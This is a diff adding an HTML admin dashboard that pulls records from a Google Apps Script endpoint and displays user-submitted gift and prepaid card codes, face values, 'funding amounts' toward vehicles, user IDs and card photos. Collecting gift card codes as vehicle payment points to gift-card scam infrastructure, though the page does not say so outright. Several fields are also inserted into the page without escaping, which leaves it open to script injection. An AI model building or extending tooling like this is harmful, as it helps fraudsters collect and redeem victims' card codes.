@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin – Card Submissions</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    .card-row:hover { background: #1a1a1a; }
+    .img-thumb { transition: transform 0.15s; }
+    .img-thumb:hover { transform: scale(1.08); }
+  </style>
+</head>
+<body class="text-white min-h-screen pb-12">
+
+  <!-- Header -->
+  <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d] sticky top-0 z-50">
+    <div class="flex items-center gap-4">
+      <a href="admin-messages.html" class="text-neutral-400 hover:text-white text-sm">‹ Messages</a>
+      <span class="text-xs font-bold tracking-widest text-[#E82127] uppercase">Card Submissions</span>
+    </div>
+    <button onclick="loadCards()" class="text-xs bg-neutral-800 hover:bg-neutral-700 border border-neutral-700 px-3 py-1.5 rounded-lg transition-all">
+      Refresh
+    </button>
+  </header>
+
+  <main class="max-w-6xl mx-auto px-4 mt-8">
+    <div class="flex items-center justify-between mb-6">
+      <div>
+        <h1 class="text-2xl font-bold tracking-tight">Card Submissions</h1>
+        <p class="text-xs text-neutral-400 mt-1">All gift / prepaid card details sent by users</p>
+      </div>
+      <div id="countBadge" class="text-xs font-mono bg-red-950/40 border border-red-900/50 text-red-400 px-3 py-1 rounded-full">
+        Loading...
+      </div>
+    </div>
+
+    <!-- Loading -->
+    <div id="loading" class="text-center py-20 text-neutral-500 text-sm">
+      Fetching card submissions...
+    </div>
+
+    <!-- Empty state -->
+    <div id="empty" class="hidden text-center py-20">
+      <p class="text-neutral-500 text-sm">No card submissions yet.</p>
+    </div>
+
+    <!-- Cards list -->
+    <div id="cardsContainer" class="space-y-4 hidden"></div>
+  </main>
+
+  <!-- Image Modal -->
+  <div id="imgModal" class="fixed inset-0 bg-black/90 z-[100] hidden items-center justify-center p-4" onclick="closeModal()">
+    <img id="modalImg" src="" class="max-w-full max-h-[90vh] rounded-xl shadow-2xl">
+  </div>
+
+  <script>
+    // ⚠️ PASTE YOUR SAME APPS SCRIPT URL HERE
+    const API_URL = "https://script.google.com/macros/s/AKfycbx7Gg2ClxC7VdaDReZzI4jV_q8RKBDYPteFN526vQjmsxWSmGDQyy-NLkDXhivOHSh0Yw/exec";
+
+    async function loadCards() {
+      const loading = document.getElementById('loading');
+      const empty = document.getElementById('empty');
+      const container = document.getElementById('cardsContainer');
+      const badge = document.getElementById('countBadge');
+
+      loading.classList.remove('hidden');
+      empty.classList.add('hidden');
+      container.classList.add('hidden');
+      container.innerHTML = '';
+      badge.textContent = 'Loading...';
+
+      try {
+        const response = await fetch(API_URL, {
+          method: 'POST',
+          mode: 'cors',
+          headers: { 'Content-Type': 'text/plain' },
+          body: JSON.stringify({ action: 'getCardSubmissions' })
+        });
+
+        const result = await response.json();
+
+        loading.classList.add('hidden');
+
+        if (result.status !== 'success' || !result.cards || result.cards.length === 0) {
+          empty.classList.remove('hidden');
+          badge.textContent = '0 cards';
+          return;
+        }
+
+        badge.textContent = result.cards.length + ' card' + (result.cards.length > 1 ? 's' : '');
+        container.classList.remove('hidden');
+
+        result.cards.forEach(card => {
+          const imagesHtml = (card.images || []).map((url, idx) => `
+            <img src="${url}" 
+                 class="img-thumb w-16 h-16 object-cover rounded-lg border border-[#333] cursor-pointer"
+                 onclick="event.stopPropagation(); openModal('${url}')"
+                 title="Image ${idx + 1}"
+                 onerror="this.style.display='none'">
+          `).join('');
+
+          const row = document.createElement('div');
+          row.className = 'card-row bg-[#141414] border border-[#222] rounded-2xl p-5 transition-all';
+          row.innerHTML = `
+            <div class="flex flex-col md:flex-row md:items-start justify-between gap-4">
+              <div class="space-y-3 flex-1">
+                <div class="flex flex-wrap items-center gap-2">
+                  <span class="text-[10px] font-mono font-bold text-[#E82127] bg-red-950/20 border border-red-900/40 px-2 py-0.5 rounded">
+                    ${card.id}
+                  </span>
+                  <span class="text-[10px] font-mono text-neutral-500">${card.timestamp}</span>
+                  <span class="text-[10px] bg-amber-950/40 border border-amber-900/50 text-amber-400 px-2 py-0.5 rounded uppercase tracking-wider">
+                    ${card.status || 'Pending'}
+                  </span>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-2 text-sm">
+                  <div>
+                    <span class="text-[10px] uppercase tracking-wider text-neutral-500">Card Name</span>
+                    <p class="font-semibold text-white">${escapeHtml(card.cardName) || '—'}</p>
+                  </div>
+                  <div>
+                    <span class="text-[10px] uppercase tracking-wider text-neutral-500">Code</span>
+                    <p class="font-mono text-emerald-400 select-all">${escapeHtml(card.cardCode) || '—'}</p>
+                  </div>
+                  <div>
+                    <span class="text-[10px] uppercase tracking-wider text-neutral-500">Face Value</span>
+                    <p class="font-semibold">${escapeHtml(card.faceValue) || '—'}</p>
+                  </div>
+                  <div>
+                    <span class="text-[10px] uppercase tracking-wider text-neutral-500">Funding Amount</span>
+                    <p class="font-semibold">$${card.amount || '0'}</p>
+                  </div>
+                  <div>
+                    <span class="text-[10px] uppercase tracking-wider text-neutral-500">Vehicle</span>
+                    <p class="text-neutral-300 text-xs">${escapeHtml(card.vehicle) || '—'}</p>
+                  </div>
+                  <div>
+                    <span class="text-[10px] uppercase tracking-wider text-neutral-500">User ID</span>
+                    <p class="font-mono text-xs text-neutral-400">${escapeHtml(card.userId)}</p>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Images -->
+              <div class="flex flex-wrap gap-2 min-w-[140px]">
+                ${imagesHtml || '<span class="text-xs text-neutral-600">No images</span>'}
+              </div>
+            </div>
+          `;
+          container.appendChild(row);
+        });
+
+      } catch (err) {
+        loading.classList.add('hidden');
+        empty.classList.remove('hidden');
+        empty.innerHTML = `<p class="text-red-400 text-sm">Failed to load: ${err.message}</p>`;
+        badge.textContent = 'Error';
+      }
+    }
+
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
+    }
+
+    function openModal(url) {
+      document.getElementById('modalImg').src = url;
+      const modal = document.getElementById('imgModal');
+      modal.classList.remove('hidden');
+      modal.classList.add('flex');
+    }
+
+    function closeModal() {
+      const modal = document.getElementById('imgModal');
+      modal.classList.add('hidden');
+      modal.classList.remove('flex');
+    }
+
+    // Load on page open
+    loadCards();
+  </script>
+</body>
+</html>
